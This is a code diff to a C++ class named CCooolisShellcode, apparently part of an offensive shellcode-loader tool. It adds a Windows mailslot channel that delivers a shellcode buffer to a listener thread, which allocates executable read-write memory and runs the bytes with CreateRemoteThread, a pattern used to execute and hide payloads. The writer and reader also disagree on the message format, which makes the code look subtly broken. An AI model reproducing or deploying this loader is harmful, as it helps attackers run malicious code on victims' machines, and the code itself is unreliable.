@@ -62,9 +62,71 @@ VOID CCooolisShellcode::ConvertShellcodeByCHAR(DWORD dwSize)
 
 VOID CCooolisShellcode::CreateThreadRun()
 {
+	DWORD dwWritten = 0;
 	DWORD dwOldProtect = NULL;
+	DWORD dwMailSlotThreadId = 0;
+	HANDLE hMailSlotThread = NULL, hMailSlot = NULL;
 	VirtualProtect(this->Shellcode, this->dwShellcodeSize, PAGE_EXECUTE, &dwOldProtect);
-	HANDLE hThread = CreateRemoteThread(GetCurrentProcess(), NULL, NULL, (LPTHREAD_START_ROUTINE)this->Shellcode, NULL, NULL, NULL);
-	WaitForSingleObject(hThread, INFINITE);
+
+	// 创建油槽线程
+	hMailSlotThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)HandleMailSlot, NULL, NULL, &dwMailSlotThreadId);
+	Sleep(1000);
+	hMailSlot = CreateFile(
+		SHELLCODE_MAILSLOTNAME, // 邮槽名称
+		GENERIC_WRITE,      // 读写属性
+		FILE_SHARE_READ,       // 共享属性
+		NULL,                       // 安全属性
+		OPEN_EXISTING,      // 打开方式
+		FILE_ATTRIBUTE_NORMAL,      // 标志位
+		NULL);                     // 文件模板（默认留空）
+								   // 2. 向mailslot写入
+	WriteFile(hMailSlot, this->Shellcode, this->dwShellcodeSize, &dwWritten, NULL);
+	if (this->dwShellcodeSize != dwWritten) {
+		return VOID();
+	}
+	CloseHandle(hMailSlot);
+	WaitForSingleObject(hMailSlotThread, INFINITE);
 	return VOID();
 }
+
+VOID CCooolisShellcode::HandleMailSlot()
+{
+	DWORD dwShellCodeSize = NULL;
+	DWORD dwReadedSize = NULL;
+	PBYTE bShellCode = NULL;
+	HANDLE hThread = NULL;
+	HANDLE hMailSlot = NULL;
+	DWORD dwCount = 0, dwSize = 0;
+
+	hMailSlot = CreateMailslot(
+		SHELLCODE_MAILSLOTNAME,// 邮槽名
+		0,					  // 无最大消息限制
+		MAILSLOT_WAIT_FOREVER,// 永不超时
+		NULL
+	);
+	if (hMailSlot == INVALID_HANDLE_VALUE) {
+		return;
+	}
+	while (TRUE) {
+		GetMailslotInfo(hMailSlot, NULL, &dwShellCodeSize, &dwCount, NULL);
+		if (dwSize == MAILSLOT_NO_MESSAGE)
+		{
+			
+			Sleep(1000);// 暂时没有消息
+			continue;
+		}
+		while (dwCount)
+		{
+			ReadFile(hMailSlot, &dwShellCodeSize, sizeof(DWORD), &dwReadedSize, NULL);
+			bShellCode = (PBYTE)VirtualAlloc(NULL, dwShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+			ReadFile(hMailSlot, bShellCode, dwShellCodeSize, &dwReadedSize, NULL);
+			hThread = CreateRemoteThread(GetCurrentProcess(), NULL, NULL, (LPTHREAD_START_ROUTINE)bShellCode, NULL, NULL, NULL);
+			WaitForSingleObject(hThread, INFINITE);
+			GetMailslotInfo(hMailSlot, 0, &dwSize, &dwCount, NULL);
+			
+		}
+	}
+	return;
+}
+
+
